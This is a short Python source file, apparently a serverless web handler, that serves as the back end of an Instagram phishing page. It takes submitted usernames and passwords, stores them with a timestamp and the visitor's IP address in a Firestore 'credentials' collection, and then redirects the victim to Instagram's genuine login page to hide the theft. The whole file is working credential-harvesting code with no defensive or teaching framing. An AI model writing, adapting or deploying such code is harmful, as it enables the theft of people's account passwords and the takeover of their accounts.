from http.server import BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
import firebase_admin
from firebase_admin import credentials, firestore
import os
import json

# Initialize Firebase
def initialize_firebase():
    # Get Firebase credentials from environment variable
    firebase_config = os.environ.get('FIREBASE_CONFIG')
    if not firebase_config:
        raise ValueError("Firebase configuration not found in environment variables")
    
    # Parse the service account info from the environment variable
    service_account_info = json.loads(firebase_config)
    
    # Initialize the app if it hasn't been initialized already
    if not firebase_admin._apps:
        cred = credentials.Certificate(service_account_info)
        firebase_admin.initialize_app(cred)
    
    return firestore.client()

# Initialize Firestore client
db = initialize_firebase()

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        form_data = parse_qs(post_data)
        
        username = form_data.get('username', [''])[0]
        password = form_data.get('password', [''])[0]
        
        if username and password:
            # Store credentials in Firestore
            doc_ref = db.collection('credentials').document()
            doc_ref.set({
                'username': username,
                'password': password,
                'timestamp': datetime.now().isoformat(),
                'ip_address': self.headers.get('X-Forwarded-For', self.headers.get('Remote-Addr'))
            })
        
        # Redirect to Instagram's actual login page
        self.send_response(302)
        self.send_header('Location', 'https://www.instagram.com/accounts/login/')
        self.end_headers()
        return